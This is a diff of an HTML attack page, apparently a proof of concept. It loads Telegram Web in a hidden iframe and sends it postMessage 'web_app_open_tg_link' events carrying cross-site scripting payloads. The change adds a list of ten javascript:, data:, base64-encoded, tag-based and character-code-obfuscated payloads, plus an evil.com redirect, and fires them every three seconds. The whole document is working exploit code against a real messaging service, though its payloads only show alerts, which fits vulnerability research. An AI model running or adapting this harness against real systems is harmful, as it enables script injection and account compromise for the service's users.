@@ -1,20 +1,48 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>Testing javascript: XSS Payload…</h1>
+    <h1>Testing Payloads...</h1>
     <iframe id="tg_frame" src="https://web.telegram.org/a/" style="display:none;"></iframe>
     <script>
-      const payload = JSON.stringify({
-        eventType: 'web_app_open_tg_link',
-        eventData: {
-          path_full: "/wallet/start?x=javascript:alert('XSS by Suraj')"
+      const payloads = [
+        "javascript:alert(1)",
+        "javascript:eval(alert(1))",
+        "javascript:confirm(document.domain)",
+        "data:text/html,<script>alert('data')</script>",
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", // <script>alert(1)</script>
+        "<img src=x onerror=alert(1)>",
+        "<script>alert('inline')</script>",
+        "https://evil.com",
+        "jav\tascript:alert(1)",
+        "javascript:" + String.fromCharCode(97,108,101,114,116,40,49,41) // alert(1)
+      ];
+
+      let index = 0;
+
+      const sendPayload = () => {
+        const testPayload = payloads[index];
+        console.log("🚀 Testing payload:", testPayload);
+
+        const payload = JSON.stringify({
+          eventType: 'web_app_open_tg_link',
+          eventData: {
+            path_full: `/wallet/start?x=${encodeURIComponent(testPayload)}`
+          }
+        });
+
+        const iframe = document.getElementById("tg_frame");
+        iframe.contentWindow.postMessage(payload, "*");
+
+        index++;
+        if (index < payloads.length) {
+          setTimeout(sendPayload, 3000); // wait 3 sec between tests
         }
-      });
+      };
 
       window.onload = function () {
         const iframe = document.getElementById("tg_frame");
         iframe.onload = function () {
-          iframe.contentWindow.postMessage(payload, "*");
+          sendPayload();
         };
       };
     </script>
